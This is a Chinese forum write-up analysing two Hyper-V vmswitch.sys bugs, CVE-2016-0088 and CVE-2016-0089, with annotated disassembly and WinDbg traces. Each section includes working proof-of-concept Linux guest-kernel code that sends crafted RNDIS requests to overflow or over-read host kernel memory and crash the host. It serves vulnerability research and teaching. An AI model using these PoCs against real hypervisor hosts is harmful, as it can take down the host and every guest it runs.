> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-222692.htm)

5. Cve-2016-0088 的分析，触发，调试

         本节介绍的是由 Google project zero 发现的 Hyper-V 漏洞，这枚漏洞于 2016 年被发现，是 vmswitch.sys 组件产生的问题，可以导致宿主机内核崩溃，造成宿主机 DOS。这个漏洞是在 Windows Server2012 R2 版本的操作系统版本上触发的，所以下面的介绍使用的 Windows 版本为：Microsoft Windows Server 2012 R2 Standard x64 且未安装任何补丁。

5.1. 漏洞分析

         这个漏洞发生在 vmswitch.sys，用于 Hyper-V 的虚拟网络设备服务。在 vmswitch! VmsMpCommonPvtHandleMulticastOids 函数中，有一处越界写内存的问题，可以造成相邻堆块的 5 字节数据的写入，破坏了下个堆块的 POOL_HEADER，在 free 下个堆块时内核便会抛出异常，导致宿主机蓝屏。

         下面我们通过 IDA 逆向分析 vmswitch! VmsMpCommonPvtHandleMulticastOids 函数，代码如下。

```
offset+0      VmsMpCommonPvtHandleMulticastOids proc near
offset+0      var_58          = qword ptr -58h
offset+0      var_50          = dword ptr -50h
offset+0      var_48          = qword ptr -48h
offset+0      var_40          = dword ptr -40h
offset+0      var_28          = byte ptr -28h
offset+0      arg_10          = dword ptr  18h
offset+0      NumberOfBytes   = qword ptr  28h
offset+0
offset+0                    mov     rax, rsp
offset+3                    mov     [rax+8], rbx
offset+7                    mov     [rax+10h], rbp
offset+B                    mov     [rax+20h], rsi
offset+F                    mov     [rax+18h], r8d
offset+13                   push    rdi
offset+14                   push    r12
offset+16                   push    r13
offset+18                   push    r14
offset+1A                   push    r15
offset+1C                   sub     rsp, 50h
offset+20                   xor     r12d, r12d
offset+23                   cmp     dword ptr [rcx+34h], 1
offset+27                   mov     r15, r9         ; src data
offset+2A                   mov     edi, r12d
offset+2D                   mov     esi, r12d
offset+30                   mov     r13b, r12b
offset+33                   mov     rbx, rcx
offset+36                   jnz     loc_1D7EF
offset+3C                   cmp     dword ptr [rcx+730h], 1
offset+43                   jnz     loc_1D7EF
offset+49                   cmp     [rcx+4CCh], r12b
offset+50                   jz      loc_1D7EF
offset+56                   mov     r14d, dword ptr [rsp+78h+NumberOfBytes]
offset+5E                   mov     [rax-38h], r12d
offset+62                   lea     r8d, [r12+1]
offset+67                   mov     [rax-40h], r14d
offset+6B                   mov     [rax-48h], r9
offset+6F                   mov     r9d, edx
offset+72                   xor     edx, edx
offset+74                   mov     [rax-50h], r12d
offset+78                   call    VmsEptCreateNicOidRequest
offset+7D                   mov     rsi, rax
offset+80                   test    rax, rax
offset+83                   jz      loc_1D7C8
offset+89                   mov     rcx, [rbx+738h]
offset+90                   lea     eax, [r12+20h]
offset+95                   xor     r9d, r9d
offset+98                   mov     [rsp+78h+var_40], eax
offset+9C                   mov     [rsp+78h+var_48], r12
offset+A1                   mov     [rsp+78h+var_50], eax
offset+A5                   lea     edx, [rax-14h]
offset+A8                   mov     r8d, 10270h
offset+AE                   mov     [rsp+78h+var_58], rsi
offset+B3                   call    VmsEptProcessPrivateOid
offset+B8                   mov     edi, eax
offset+BA                   test    eax, eax
offset+BC                   jnz     loc_1D790
offset+C2                   mov     rcx, [rbx+28h]
offset+C6                   lea     rdx, [rsp+78h+arg_10]
offset+CE                   xor     r8d, r8d
offset+D1                   call    cs:__imp_NdisAcquireRWLockWrite
offset+D7                   mov     eax, 0AAAAAAABh
offset+DC                   mov     r13b, 1         
offset+DC                           ; r14 中保存的是linux kernel中的set->info_buflen
offset+DF                   mul     r14d            ; 这里是个除法操作，除以6
offset+E2                   mov     ebp, edx
offset+E4                   shr     ebp, 2
offset+E7                   test    ebp, ebp        ; 除法结果在ebp中
offset+E9                   jz      loc_31B04
offset+EF   loc_1D72F:; CODE XREF: VmsMpCommonPvtHandleMulticastOids+144CE
offset+EF                   cmp     ebp, [rbx+0EE8h] 
offset+EF             ; rbx+ee0保存分配的堆指针，rbx+ee8保存的是(set->info_buflen)/6
offset+EF             ; 如果是第一次运行到这，[rbx+ee8], [rbx+ee0]都为0
offset+F5                   jz      loc_31B2B
offset+FB                   mov     r8d, 'mcMV'     ; Tag
offset+101                  mov     rdx, r14        ; NumberOfBytes
offset+104                  mov     ecx, 200h       ; PoolType
offset+109                  mov     r12, r14      
offset+109                            ; 这里是第一次访问时分配堆内存的地方r14为POC中的
offset+109                            ; set->info_buflen = extlen
offset+10C                  call    cs:__imp_ExAllocatePoolWithTag
offset+112                  mov     r14, rax
offset+115                  test    rax, rax
offset+118                  jz      loc_1D7E8
offset+11E                  mov     r8, r12         ; Size
offset+121                  mov     rdx, r15        ; Src
offset+124                  mov     rcx, rax        ; Dst
offset+127                  call    memmove
offset+12C                  mov     rcx, [rbx+0EE0h] ; P
offset+133                  test    rcx, rcx
offset+136                  jz      short loc_1D783
offset+138                  mov     edx, 'mcMV'     ; Tag
offset+13D                  call    cs:__imp_ExFreePoolWithTag
offset+143  loc_1D783:; CODE XREF: offset+136
offset+143                  mov     [rbx+0EE0h], r14;保存分配的堆地址
offset+143                                            ;大小为set->info_buflen
offset+14A  loc_1D78A:; CODE XREF: offset+144E6
offset+14A            ; offset+144FE
offset+14A                  mov     [rbx+0EE8h], ebp ; 一次访问结束后会保存这次的
offset+14A                                          ; (set->info_buflen)/6
offset+150  loc_1D790:; CODE XREF: offset+BC
offset+150            ; offset+1AD
offset+150                  test    rsi, rsi
offset+153                  jz      short loc_1D7B1
offset+155                  mov     rcx, [rsi+18h]
offset+159                  mov     ebp, 'PssV'
offset+15E                  mov     edx, ebp
offset+160                  call    cs:__imp_NdisFreeMemoryWithTag
offset+166                  mov     edx, ebp
offset+168                  mov     rcx, rsi
offset+16B                  call    cs:__imp_NdisFreeMemoryWithTag
offset+171  loc_1D7B1:; CODE XREF: offset+153
offset+171                  test    r13b, r13b
offset+174                  jz      short loc_1D7C8
offset+176                  mov     rcx, [rbx+28h]
offset+17A                  lea     rdx, [rsp+78h+arg_10]
offset+182                  call    cs:__imp_NdisReleaseRWLock
offset+188  loc_1D7C8:; CODE XREF: offset+83
offset+188            ; offset+174
offset+188                  lea     r11, [rsp+78h+var_28]
offset+18D                  mov     eax, edi
offset+18F                  mov     rbx, [r11+30h]
offset+193                  mov     rbp, [r11+38h]
offset+197                  mov     rsi, [r11+48h]
offset+19B                  mov     rsp, r11
offset+19E                  pop     r15
offset+1A0                  pop     r14
offset+1A2                  pop     r13
offset+1A4                  pop     r12
offset+1A6                  pop     rdi
offset+1A7                  retn
offset+1A8  ; -------------------------------------------------------------------
offset+1A8  loc_1D7E8:; CODE XREF: offset+118
offset+1A8                  mov     edi, 0C000009Ah
offset+1AD                  jmp     short loc_1D790
offset+1AF  ; -------------------------------------------------------------------
offset+1AF  loc_1D7EF:; CODE XREF: offset+36
offset+1AF            ; offset+43
offset+1AF                  mov     edi, 0C0000001h
offset+1B4                  jmp     short loc_1D790
offset+1B4  VmsMpCommonPvtHandleMulticastOids endp
offset+144C4 ; ------------------------------------------------------------------
offset+144C4 loc_31B04:; CODE XREF: offset+E9
offset+144C4                 mov     rcx, [rbx+0EE0h] ; P
offset+144CB                 test    rcx, rcx
offset+144CE                 jz      loc_1D72F     
offset+144D4                 mov     edx, 'mcMV'     ; Tag
offset+144D9                 call    cs:__imp_ExFreePoolWithTag
offset+144DF                 mov     [rbx+0EE0h], r12
offset+144E6                 jmp     loc_1D78A       
offset+144EB ; ------------------------------------------------------------------
offset+144EB loc_31B2B:; CODE XREF: offset+F5
offset+144EB                 mov     rcx, [rbx+0EE0h] ; Dst
offset+144F2                 mov     r8, r14         ; Size
offset+144F5                 mov     rdx, r15        ; Src
offset+144F8                 call    memmove         ; 第二次访问时，没有检查r14的值，
offset+144F8                            ; poc这里r14值为set->info_buflen = extlen+5
offset+144F8                                         ; 实现5字节溢出
offset+144FD                 nop
offset+144FE                 jmp     loc_1D78A      
offset+144FE ; ------------------------------------------------------------------

```

         该漏洞需要连续运行两次 vmswitch! VmsMpCommonPvtHandleMulticastOids 函数才能触发。

第一次执行 vmswitch! VmsMpCommonPvtHandleMulticastOids 函数时，会先分配一个大小为 set->info_buflen 的内存，然后在 offset+0x143，offset+0x14A 处分别保存分配的内存的地址以及 set->info_buflen/6 的值。

第二次执行 vmswitch! VmsMpCommonPvtHandleMulticastOids 函数时， 会先检查 set->info_buflen/6 的值是否和第一次执行时在 offset+0x14A 的值相等。简单来说，就是检查第二次调用 vmswitch! VmsMpCommonPvtHandleMulticastOid 函数时 set->info_buflen 整除 6 的值必须要相等，比如第一次调用时 set->info_buflen = 60，第二次调用时候 set->info_buflen 可以为 65，他们整除结果是一样的，所以第二次调用函数时相对于上次 set->info_buflen 最大偏移为 5 字节。随后代码运行到 offset+144EB，由于第一次调用时分配的 buffer 大小只有 set->info_buflen = extlen，但是现在需要向这个内存中拷贝 extlen+5 字节的数据，直接导致覆盖了下个堆块的前 5 字节，破坏了 POOL_HEADER，在系统 free 后面这块内存时抛出异常，导致蓝屏。

5.2. PoC 编写与漏洞触发

         这里，我们使用 Linux 作为虚拟机系统，由于 Linux 内核可以随意修改，所以减少了编写 PoC 的难度，笔者的 Linux 内核版本为 4.7.2。

         这里我们的 PoC 可以直接通过修改 Hyper-V 在 Linux 内核驱动代码实现，故我们在./linux-4.7.2/drivers/net/hyperv/rndis_filter.c 文件中添加如下代码。

```
static int rndis_filter_query_device_mac(struct rndis_device *dev)
{//这个函数是Linux Kernel中原有的函数，我们需要修改它
u32 size = ETH_ALEN;
rndis_pool_overflow(dev);//这是我们加上的语句
return rndis_filter_query_device(dev,
RNDIS_OID_802_3_PERMANENT_ADDRESS,
dev->hw_mac_adr, &size);
}
//下面为新增加的函数，用于触发漏洞
static int rndis_pool_overflow(struct rndis_device *rdev)
{
int ret;
  struct net_device *ndev = rdev->ndev;
  struct rndis_request *request;
  struct rndis_set_request *set;
  struct rndis_set_complete *set_complete;
  u32 extlen = 16 * 6;
  unsigned long t;
  request = get_rndis_request(
    rdev, RNDIS_MSG_SET,
    RNDIS_MESSAGE_SIZE(struct rndis_set_request) + extlen);
  if (!request)
    return -ENOMEM;
  set = &request->request_msg.msg.set_req;
  set->oid = 0x01010209; // OID_802_3_MULTICAST_LIST
  set->info_buflen = extlen;
  set->info_buf_offset = sizeof(struct rndis_set_request);
  set->dev_vc_handle = 0;
  ret = rndis_filter_send_request(rdev, request);//将数据发送至宿主机
  if (ret != 0)
    goto cleanup;
  t = wait_for_completion_timeout(&request->wait_event, 5*HZ);
  if (t == 0)
    return -ETIMEDOUT;
  else {
    set_complete = &request->response_msg.msg.set_complete;
    if (set_complete->status != RNDIS_STATUS_SUCCESS) {
      printk(KERN_INFO "failed to set multicast list: 0x%x\n",
        set_complete->status);
      ret = -EINVAL;
    }
  }
  put_rndis_request(rdev, request);
  request = get_rndis_request(rdev, RNDIS_MSG_SET,
    RNDIS_MESSAGE_SIZE(struct rndis_set_request) + extlen + 5);
  if (!request)
    return -ENOMEM;
  set = &request->request_msg.msg.set_req;
  set->oid = 0x01010209; // OID_802_3_MULTICAST_LIST
  set->info_buflen = extlen + 5;
  set->info_buf_offset = sizeof(struct rndis_set_request);
  set->dev_vc_handle = 0;
  ret = rndis_filter_send_request(rdev, request); //将数据发送至宿主机
  if (ret != 0)
    goto cleanup;
  t = wait_for_completion_timeout(&request->wait_event, 5*HZ);
  if (t == 0)
    return -ETIMEDOUT;
  else {
    set_complete = &request->response_msg.msg.set_complete;
    if (set_complete->status != RNDIS_STATUS_SUCCESS) {
      printk(KERN_INFO "failed to set multicast list: 0x%x\n",
        set_complete->status);
      ret = -EINVAL;
    }
 }
cleanup:
  put_rndis_request(rdev, request);
  return ret;
}

```

         从 PoC 中的代码可以看出，新增的函数 rndis_pool_overflow 连续发送了两次数据，上面代码中设置 set->oid = 0x01010209; // OID_802_3_MULTICAST_LIST 是为了保证虚拟机传来的数据能走到 vmswitch! VmsMpCommonPvtHandleMulticastOids 函数。两次发送的数据中，set->info_buflen 字段的值分别为 extlen，和 extlen+5，印证了上面分析过程中的 5 字节溢出。

         保存文件，并且重新编译内核。重启 Linux 宿主机后，Linux 系统正常启动，并没有什么异常，但是此时已经发生了溢出，现在只需要关掉虚拟机，让 Windows 内核回收被溢出的那块内存，便会发生蓝屏，如图 1-35。

![](https://bbs.pediy.com/upload/attach/201711/624619_hxchq6o8wxk3ioh.png)

图 1-35

5.3. 调试

         在 WinDbg 中设置 VmsMpCommonPvtHandleMulticastOids+144f8 处断点，分别观察两次调用 VmsMpCommonPvtHandleMulticastOids 函数后调用 memmove 前后的内存对比。

```
3: kd> bp vmswitch!VmsMpCommonPvtHandleMulticastOids+0x144f8
3: kd> g
Breakpoint 0 hit
vmswitch!VmsMpCommonPvtHandleMulticastOids+0x144f8:
fffff801`b3940b38 e8c396ffff      call    vmswitch!memcpy (fffff801`b393a200)
3: kd> db rcx-10
ffffe001`7501d950  10 00 07 02 56 4d 63 6d-33 eb 5f 64 e6 5b 43 5e  ....VMcm3._d.[C^
ffffe001`7501d960  48 48 48 48 48 48 48 48-48 48 48 48 48 48 48 48  HHHHHHHHHHHHHHHH
ffffe001`7501d970  48 48 48 48 48 48 48 48-48 48 48 48 48 48 48 48  HHHHHHHHHHHHHHHH
ffffe001`7501d980  48 48 48 48 48 48 48 48-00 00 00 00 00 00 00 00  HHHHHHHH........
ffffe001`7501d990  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffe001`7501d9a0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffe001`7501d9b0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffe001`7501d9c0  07 00 08 04 45 76 65 6e-a3 eb 5f 64 e6 5b 43 5e  ....Even.._d.[C^
3: kd> p
vmswitch!VmsMpCommonPvtHandleMulticastOids+0x144fd:
fffff801`b3940b3d 90              nop
3: kd> db ffffe001`7501d950
ffffe001`7501d950  10 00 07 02 56 4d 63 6d-33 eb 5f 64 e6 5b 43 5e  ....VMcm3._d.[C^
ffffe001`7501d960  49 49 49 49 49 49 49 49-49 49 49 49 49 49 49 49  IIIIIIIIIIIIIIII
ffffe001`7501d970  49 49 49 49 49 49 49 49-49 49 49 49 49 49 49 49  IIIIIIIIIIIIIIII
ffffe001`7501d980  49 49 49 49 49 49 49 49-49 49 49 49 49 49 49 49  IIIIIIIIIIIIIIII
ffffe001`7501d990  49 49 49 49 49 49 49 49-49 49 49 49 49 49 49 49  IIIIIIIIIIIIIIII
ffffe001`7501d9a0  49 49 49 49 49 49 49 49-49 49 49 49 49 49 49 49  IIIIIIIIIIIIIIII
ffffe001`7501d9b0  49 49 49 49 49 49 49 49-49 49 49 49 49 49 49 49  IIIIIIIIIIIIIIII
ffffe001`7501d9c0  49 49 49 49 49 76 65 6e-a3 eb 5f 64 e6 5b 43 5e  IIIIIven.._d.[C^
3: kd> g

```

         通过上面，可以发现下一个堆块的 POOL_HEADER 已经被垃圾数据破坏了 5 字节，如果内核释放这部分内存，则会触发 BugCheck。

```
1: kd> !analyze -v
*******************************************************************************
*                                                                             *
*                        Bugcheck Analysis                                    *
*                                                                             *
*******************************************************************************
 
BAD_POOL_HEADER (19)
The pool is already corrupt at the time of the current request.
This may or may not be due to the caller.
The internal pool links must be walked to figure out a possible cause of
the problem, and then special pool applied to the suspect tags or the driver
verifier to a suspect driver.
Arguments:
Arg1: 0000000000000020, a pool block header size is corrupt.
Arg2: ffffe0017501d9c0, The pool entry we were looking for within the page.
Arg3: ffffe0017501de50, The next pool entry.
Arg4: 0000000004494949, (reserved)
 
Debugging Details:
------------------
 
 
ffffe0017501d9c0 doesn't look like a valid small pool allocation, checking to see
if the entire page is actually part of a large page allocation...

```

         POOL_HEADER 的结构如下。

```
typedef struct _POOL_HEADER
{
  union
  {
    struct
    {
    /*0x000*/ ULONG32 PreviousSize : 8;
    /*0x000*/ ULONG32 PoolIndex : 8;
    /*0x000*/ ULONG32 BlockSize : 8;
    /*0x000*/ ULONG32 PoolType : 8;
    };
    /*0x000*/ ULONG32 Ulong1;
  };
  /*0x004*/ ULONG32 PoolTag;
  union
  {
  /*0x008*/ struct _EPROCESS* ProcessBilled;
    struct
    {
    /*0x008*/ UINT16 AllocatorBackTraceIndex;
    /*0x00A*/ UINT16 PoolTagHash;
    /*0x00C*/ UINT8 _PADDING0_[0x4];
    };
  };
} POOL_HEADER, *PPOOL_HEADER;

```

         可以看到，这个漏洞将 POOL_HEADER 结构的前五个字节，即 PreviousSize, PoolIndex, BlockSize, PoolType 和部分 PoolTag 覆盖掉，导致宿主机系统崩溃。

5.4. 总结

可以看到，因为 Hyper-V 的特殊的宿主机和虚拟机之间的关系，一旦 Hyper-V 宿主机中的驱动出现问题，那么对整个云系统的打击可以说是非常大的，哪怕不能造成代码执行，也可以造成大面积云上业务的下线。这个漏洞较为简单，可以作为 Hyper-V 安全研究的范例。

6. Cve-2016-0089 的分析，触发，调试

         本节漏洞同样是由 Google project zero 团队发现的，问题出在 vmswitch.sys 组件上，会导致 Windows 宿主机的崩溃，造成 DOS。这个漏洞是在 Microsoft Windows Server 2012 R2 Standard x64 且未安装任何补丁的操作系统版本上触发。

6.1. 漏洞分析

该漏洞问题处在 vmswitch! VmsVmNicHandleRssParametersChange 函数中，是越界读到非法的内存区域导致宿主机内核崩溃。下面我们通过部分 IDA 中代码来探究问题所在。

```
VmsVmNicHandleRssParametersChange+11C          mov     edx, [rbp+10h] 
VmsVmNicHandleRssParametersChange+11C     ; [rbp+10] ---- Rssp->indirect_taboffset
VmsVmNicHandleRssParametersChange+11F          movzx   r13d, r15w
VmsVmNicHandleRssParametersChange+123          lea     r12, [rsi+294h]
VmsVmNicHandleRssParametersChange+12A          mov     r8d, r13d      
VmsVmNicHandleRssParametersChange+12A                        ; rbp ---- Rssp
VmsVmNicHandleRssParametersChange+12D          add     rdx, rbp        ; Src
VmsVmNicHandleRssParametersChange+130          mov     rcx, r12        ; Dst
VmsVmNicHandleRssParametersChange+133          shl     r8, 2          ; Size
VmsVmNicHandleRssParametersChange+137          call    memmove
VmsVmNicHandleRssParametersChange+13C          xor     eax, eax
VmsVmNicHandleRssParametersChange+13E          mov     [rsi+494h], r15w
VmsVmNicHandleRssParametersChange+146          mov     byte ptr [rsi+496h], 1
VmsVmNicHandleRssParametersChange+14D          cmp     ax, r15w
VmsVmNicHandleRssParametersChange+151          jnb     short loc_64FDB
VmsVmNicHandleRssParametersChange+215  loc_65089:
VmsVmNicHandleRssParametersChange+215        mov     edx, [rbp+18h]  
VmsVmNicHandleRssParametersChange+215        ; [rbp+18h] ---- rssp->kashkey_offset
VmsVmNicHandleRssParametersChange+218        movzx   r8d, word ptr [rbp+14h] ; Size
VmsVmNicHandleRssParametersChange+21D        lea     rbx, [rsi+497h]
VmsVmNicHandleRssParametersChange+224        add     rdx, rbp        ; Src
VmsVmNicHandleRssParametersChange+227        mov     rcx, rbx        ; Dst
VmsVmNicHandleRssParametersChange+22A        call    memmove
VmsVmNicHandleRssParametersChange+22F        movzx   eax, word ptr [rbp+14h]
VmsVmNicHandleRssParametersChange+233        lea     rcx, [rsi+4C8h]
VmsVmNicHandleRssParametersChange+23A        mov     r8d, eax
VmsVmNicHandleRssParametersChange+23D        mov     rdx, rbx
VmsVmNicHandleRssParametersChange+240        mov     [rsi+4C0h], ax
VmsVmNicHandleRssParametersChange+247   call    cs:__imp_RtlInitializeToeplitzHash
VmsVmNicHandleRssParametersChange+24D        mov     [rsi+4E0h], al
VmsVmNicHandleRssParametersChange+253        test    al, al
VmsVmNicHandleRssParametersChange+255        jnz     short loc_65129

```

         通过上面的代码可知，两处代码在调用 memmove 函数时，没有检查 Src 参数指向的内存是否越界。参数 Src 的值是由一个地址加上偏移而得来的，但是这个偏移我们是能通过虚拟机发送的数据控制的，所以造成了宿主机驱动中的越界读。一旦偏移足够大，读到非法的内存位置便可以造成 BugCheck，导致宿主机蓝屏。

在上面的汇编代码中，VmsVmNicHandleRssParametersChange+0x11C 语句是将虚拟机传来的数据 rssp->indirect_taboffset 加上一个地址便是 memmove 函数的 Src 参数，由于 rssp->indirect_taboffset 可以控制，所以 Src 参数便可以从虚拟机中控制。上文中另外一处代码 VmsVmNicHandleRssParametersChange+0x215 也是如此。

6.2. PoC 编写与漏洞触发

         和上面一样，这里我们的 PoC 可以直接通过修改 Hyper-V 在 Linux 内核驱动代码实现，故我们在./linux-4.7.2/drivers/net/hyperv/rndis_filter.c 文件中添加如下代码。

```
static int rndis_filter_query_device_mac(struct rndis_device *dev)
{//这个函数是Linux Kernel中原有的函数，我们需要修改它
u32 size = ETH_ALEN;
rndis_pool_overflow(dev);//这是我们加上的语句
return rndis_filter_query_device(dev,
RNDIS_OID_802_3_PERMANENT_ADDRESS,
dev->hw_mac_adr, &size);
}
//下面为新增加的函数，用于触发漏洞
static int rndis_pool_overflow(struct rndis_device *rdev)
{
  printk(KERN_ALERT"[+]Run POC!");
  struct net_device *ndev = rdev->ndev;
  int num_queue = 0;
  struct rndis_request *request;
  struct rndis_set_request *set;
  struct rndis_set_complete *set_complete;
  u32 extlen = sizeof(struct ndis_recv_scale_param) +
               4*ITAB_NUM + HASH_KEYLEN;
  struct ndis_recv_scale_param *rssp;
  u32 *itab;
  u8 *keyp;
  int i, ret;
  unsigned long t;
  request = get_rndis_request(
      rdev, RNDIS_MSG_SET,
      RNDIS_MESSAGE_SIZE(struct rndis_set_request) + extlen);
  if (!request)
    return -ENOMEM;
 
  set = &request->request_msg.msg.set_req;
  set->oid = OID_GEN_RECEIVE_SCALE_PARAMETERS;
  set->info_buflen = extlen;
  set->info_buf_offset = sizeof(struct rndis_set_request);
  set->dev_vc_handle = 0;
 
  rssp = (struct ndis_recv_scale_param *)(set + 1);
  rssp->hdr.type = NDIS_OBJECT_TYPE_RSS_PARAMETERS;
  rssp->hdr.rev = NDIS_RECEIVE_SCALE_PARAMETERS_REVISION_2;
  rssp->hdr.size = sizeof(struct ndis_recv_scale_param);
  rssp->flag = 0;
  rssp->hashinfo = NDIS_HASH_FUNC_TOEPLITZ | NDIS_HASH_IPV4 |
      NDIS_HASH_TCP_IPV4 | NDIS_HASH_IPV6 |
      NDIS_HASH_TCP_IPV6;
  rssp->indirect_tabsize = 4*ITAB_NUM;
  rssp->indirect_taboffset = 0x80808080;//这里会导致越界读
  rssp->hashkey_size = HASH_KEYLEN;
  rssp->kashkey_offset = rssp->indirect_taboffset +
                         rssp->indirect_tabsize;
 
  ret = rndis_filter_send_request(rdev, request);
  if (ret != 0)
    goto cleanup;
  t = wait_for_completion_timeout(&request->wait_event, 5*HZ);
  if (t == 0) {
    netdev_err(ndev, "timeout before we got a set response...\n");
    /* can't put_rndis_request, since we may still receive a
    * send-completion.
    */
    return -ETIMEDOUT;
  } else {
  set_complete = &request->response_msg.msg.set_complete;
    if (set_complete->status != RNDIS_STATUS_SUCCESS) {
        netdev_err(ndev, "Fail to set RSS parameters:0x%x\n",
                   set_complete->status);
        ret = -EINVAL;
    }
  }
cleanup:
  put_rndis_request(rdev, request);
  return ret;
}

```

         PoC 代码非常简单，只需修改 rssp->indirect_taboffset 或者 rssp->kashkey_offset 的值即可，然后重新编译内核，重启虚拟机，便可复现漏洞。

6.3. 调试

         WinDbg 在 vmswitch! VmsVmNicHandleRssParametersChange 函数偏移 0x11C 处设置断点，启动虚拟机，等待断点被访问。

```
3: kd> bp vmswitch! VmsVmNicHandleRssParametersChange+11c
3: kd> g
Breakpoint 0 hit
vmswitch!VmsVmNicHandleRssParametersChange+0x11c:
fffff800`4a4d8f90 8b5510          mov     edx,dword ptr [rbp+10h]
0: kd> p
vmswitch!VmsVmNicHandleRssParametersChange+0x11f:
fffff800`4a4d8f93 450fb7ef        movzx   r13d,r15w
0: kd> r edx
edx=80808080
0: kd> p
vmswitch!VmsVmNicHandleRssParametersChange+0x123:
fffff800`4a4d8f97 4c8da694020000  lea     r12,[rsi+294h]
0: kd> p
vmswitch!VmsVmNicHandleRssParametersChange+0x12a:
fffff800`4a4d8f9e 458bc5          mov     r8d,r13d
0: kd> p
vmswitch!VmsVmNicHandleRssParametersChange+0x12d:
fffff800`4a4d8fa1 4803d5          add     rdx,rbp
0: kd> r rbp
rbp=ffffe00102c48220
0: kd> db rbp
DBGHELP: SharedUserData - virtual symbol module
ffffe001`02c48220  89 02 28 00 00 00 00 00-01 17 00 00 00 02 00 00  ..(.............
ffffe001`02c48230  80 80 80 80 2a 00 00 00-80 82 80 80 00 00 00 00  ....*...........
ffffe001`02c48240  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffe001`02c48250  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffe001`02c48260  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffe001`02c48270  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffe001`02c48280  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffe001`02c48290  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
0: kd> p
vmswitch!VmsVmNicHandleRssParametersChange+0x130:
fffff800`4a4d8fa4 498bcc          mov     rcx,r12
0: kd> r rdx
rdx=ffffe001834502a0
0: kd> db rdx
ffffe001`834502a0  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
ffffe001`834502b0  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
ffffe001`834502c0  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
ffffe001`834502d0  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
ffffe001`834502e0  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
ffffe001`834502f0  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
ffffe001`83450300  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
ffffe001`83450310  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
0: kd> g
KDTARGET: Refreshing KD connection
 
*** Fatal System Error: 0x000000d1
                       (0xFFFFE001834502A0,0x0000000000000002,0x0000000000000000,0xFFFFF8004A49F27A)
 
Break instruction exception - code 80000003 (first chance)
 
A fatal system error has occurred.
Debugger entered on first try; Bugcheck callbacks have not been invoked.
 
A fatal system error has occurred.
 
nt!DbgBreakPointWithStatus:
fffff800`285e2590 cc              int     3

```

         通过调试过程，我们可以看到虚拟机中的 rssp->indirect_taboffset 确实可以控制问题代码处的要加上的地址偏移的值，并且最终读到了一个未初始化的内存区域，导致系统 BugCheck，造成 Windows 宿主机 DOS。

6.4. 总结

         上面两个 Hyper-V 的漏洞都会对宿主机产生很大影响，但是当我们探究漏洞原因时会发现漏洞的成因其实非常的简单，漏洞成因仅仅是因为没有判断便宜的大小。这个低级错误也说明了 Hyper-V 产品中代码中也是存在类似问题的，可能还会存在危害更加严重的问题，甚至能造成虚拟机逃逸。

最后的话：到此为止，这个系列就结束了。当时研究 Hyper-V 的时候走了很多弯路，浪费了很多时间，我希望我的文章能帮助想研究 Hyper-V 的朋友们入个门。

然后吐槽一下微软，今年三月份报的漏洞，上个月才有的致谢，这个效率无力吐槽。（也有可能是我的洞太渣了。。。）

至于我发现的漏洞，问题出现在 vmuidevices.dll 组件中，主要负责显示的组件，在处理 Hyper-V 管理器面板虚拟机缩略图时出现的问题。有兴趣的朋友可以用不打补丁的 windows 研究下。当时发现完漏洞，觉得微软怎么也能写出这样的代码。后来自己接触了有关图形的一些编程后，才觉得图形处理确实有点复杂。所以说，虽然过去了这么长时间，我还是认为 vmuidevices.dll 中还是有安全漏洞。但是由于是用户态的组件，就算发现了漏洞，利用也是很头疼的事情。相比于发现内核态组件的安全问题，用户态组件安全问题往往危害没有那么大。内核态出问题，整个宿主机挂掉；用户态组件出问题也许直接被异常处理接管了，不挂调试器都看不到。。。

______________________________________________________________________________________________

本文如需引用转载请联系本文作者，看雪 ID：ifyou

[[公告] 推荐好文功能上线，分享知识还可以得雪币！推荐一篇文章获得 20 雪币！](https://zhuanlan.kanxue.com/article-external_link.htm)

上传的附件：

*   [5.pdf](javascript:void(0)) （684.26kb，78 次下载）
*   [6.pdf](javascript:void(0)) （576.84kb，78 次下载）